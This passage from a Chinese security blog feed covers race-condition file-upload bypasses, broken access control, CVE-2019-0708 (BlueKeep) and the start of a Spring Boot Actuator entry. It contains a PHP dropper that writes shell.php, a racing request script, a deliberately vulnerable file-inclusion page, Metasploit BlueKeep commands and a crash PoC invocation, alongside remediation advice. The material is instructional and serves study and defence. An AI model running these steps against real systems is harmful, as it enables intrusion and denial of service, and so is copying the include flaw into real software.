<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure>



<h3 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h3><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>条件竞争上传是一种服务器端的漏洞，由于后端程序操作逻辑不合理导致。<br>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生，此漏洞一般发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">直接保存</button></li><li class="tab"><button type="button" data-href="#-2">白名单检测</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p>文件先通过move_uploaded_file进行保存，然后用in_array判断文件是否为图片类型，如果是就用rename进行重命名，如果不是，则使用unlink删除文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>首先上传一个php文件，当然这个文件会被立马删掉，所以我们使用burp suite不断的进行上传操作，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<p>先上传一个正常的图片，判断文件上传的地址</p>
<p>创建一个php文件，写入如下代码，该代码会生成一个包含恶意代码的php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,w),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过burp suite不断进行上传操作，一边不断访问文件上传的地址，因为条件竞争关系，文件可能会在上传之后没有来得及改名</p>
<p>这里可以通过python脚本不断进行访问（也可以手动访问）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	req = requests.get(<span class="string">&quot;文件上传地址&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;访问成功，&quot;</span>+<span class="string">&quot;响应码：&quot;</span>+<span class="built_in">str</span>(req.status_code))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;test~&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>成功的时候，<code>shell.php</code>文件已经被写入，直接访问即可</p>
<p>如果存在文件包含，可以直接上传图片马，再进行文件包含</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>这里先进行白名单判断，拒绝不在白名单里文件的上传操作，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>上传图片马，通过条件竞争，图片马来不及改名就被上传了</p>
<p>可以在一定条件下免去查找新文件名</p>
<p>利用文件包含执行php代码</p>
<p>include.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=upload/xxx.jpg</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>





]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>越权漏洞</title>
    <url>//7e65569ca276.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>越权访问（Broken Access Control，简称BAC）是未必应用程序中一种常见的漏洞，范围广，危害大。</p>
<p>该漏洞是指应用在检查授权时存在纰漏，使得攻击者在活动地权限账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增，删，改，查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就容易导致越权漏洞</p>
<p>靶场：<a href="http://www.wbug.org:9003/">http://www.wbug.org:9003/</a></p>
<h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><p>越权访问漏洞主要分为水平越权，垂直越权</p>
<p><strong>水平越权</strong>：指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。</p>
<p><strong>垂直越权</strong>：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。比如用户A与用户B是处于两个不等的等级，低等级用户获取到了高等级用户权限，这种称之为垂直越权漏洞</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>越权访问漏洞最基础的是ID</li>
<li>发生越权访问的前提是两个用户处于同一张数据表内</li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3><p>通常情况下，一个web程序的功能流程是登录-提交请求-验证权限-数据库查询-返回结果。</p>
<p>如果权限验证不足，就会导致越权。常见的程序通常会认为通过登录之后即可验证用户的身份，从而不会去做下一步的验证，最后导致越权。</p>
<h3 id="越权行为"><a href="#越权行为" class="headerlink" title="越权行为"></a>越权行为</h3><h4 id="通过隐藏URL"><a href="#通过隐藏URL" class="headerlink" title="通过隐藏URL"></a>通过隐藏URL</h4><p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
<h4 id="直接对象引用"><a href="#直接对象引用" class="headerlink" title="直接对象引用"></a>直接对象引用</h4><p>这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
<h4 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h4><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
<h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
<h4 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h4><p>一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
<h3 id="cookie越权"><a href="#cookie越权" class="headerlink" title="cookie越权"></a>cookie越权</h3><ul>
<li>平行越权<ul>
<li>userid<ul>
<li>1</li>
<li>2</li>
</ul>
</li>
<li>username<ul>
<li>zhangsan</li>
<li>wangwu</li>
</ul>
</li>
</ul>
</li>
<li>垂直越权<ul>
<li>nember_type<ul>
<li>user</li>
<li>admin</li>
<li>root</li>
<li>manager</li>
<li>system</li>
</ul>
</li>
<li>user_type<ul>
<li>0</li>
<li>1</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当我们找到一些关键参数，如id,user_id,pid等，关注每一个可能决定用户权限的参数值，通过加减1提交整数值，查看是否显示超出权限的数据，如参数不是数字，则查找相关权限词组，比如把user改成admin，查看是否显示超出权限的数据。</p>
<h3 id="ID类型"><a href="#ID类型" class="headerlink" title="ID类型"></a>ID类型</h3><p>常规类型：1，2，3，4，5…..</p>
<p>加密类型：如MD5加密</p>
<p>加码类型：如base64</p>
<p>随机类型：字母+数字</p>
<p>可推理类型：如日期+序号</p>
<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、前后端同时对用户输入信息进行校验，双重验证机制</p>
<p>2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
<p>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
<p>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。</p>
<p>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
<p>6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>越权漏洞</category>
      </categories>
      <tags>
        <tag>越权漏洞</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
    <url>//ddf32da2222d.html</url>
    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
<li>Windows 7</li>
<li>Windows server 2008 R2</li>
<li>Windows server 2008</li>
<li>Windows 2003</li>
<li>Windows xp</li>
</ul>
<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>

<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@root:~/桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>

<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>

<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>



<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
<p>2.安装安全管家类的软件</p>
<p>3.关闭远程桌面，开启防火墙</p>
<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>操作系统漏洞</category>
        <category>远程代码执行漏洞</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Autuator未授权访问</title>
    <url>//a45b2452a531.html</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​        Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限</p>
<p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
<p>组件版本的相互依赖关系：</p>
<table>
<thead>
<tr>
<th align="center">依赖项</th>
<th align="center">版本列表及依赖组件版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">spring-boot-starter-parent</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
</tr>
<tr>
<td align="center">spring-boot-dependencies</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
</tr>
<tr>
<td align="center">spring-cloud-dependencies</td>
<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
</tr>
</tbody></table>
<p>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</p>
<table>
<thead>
<tr>
<th align="center">Spring Cloud 大版本</th>
<th align="center">Spring Boot 版本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Angel</td>
<td align="center">兼容 Spring Boot 1.2.x</td>
</tr>
<tr>
<td align="center">Brixton</td>
<td align="center">兼容 Spring Boot 1.3.x、1.4.x</td>
</tr>
<tr>
<td align="center">Camden</td>
<td align="center">兼容 Spring Boot 1.4.x、1.5.x</td>
</tr>
<tr>
<td align="center">Dalston</td>
<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td align="center">Edgware</td>
<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
</tr>
<tr>
<td align="center">Finchley</td>
<td align="center">兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
</tr>
<tr>
<td align="center">Greenwich</td>
<td align="center">兼容 Spring Boot 2.1.x</td>
</tr>
<tr>
<td align="center">Hoxton</td>
<td align="center">兼容 Spring Boot 2.2.x</td>
</tr>
</tbody></table>
<p>Spring Cloud 小版本号的后缀及含义:</p>
<table>
<thead>
<tr>
<th align="center">小版本号后缀</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BUILD-SNAPSHOT</td>
<td align="center">快照版，代码不是固定，处于变化之中</td>
</tr>
<tr>
<td align="center">MX</td>
<td align="center">里程碑版</td>
</tr>
<tr>
<td align="center">RCX</td>
<td align="center">候选发布版</td>
</tr>
<tr>
<td align="center">RELEASE</td>
<td align="center">正式发布版</td>
</tr>
<tr>
<td align="center">SRX</td>
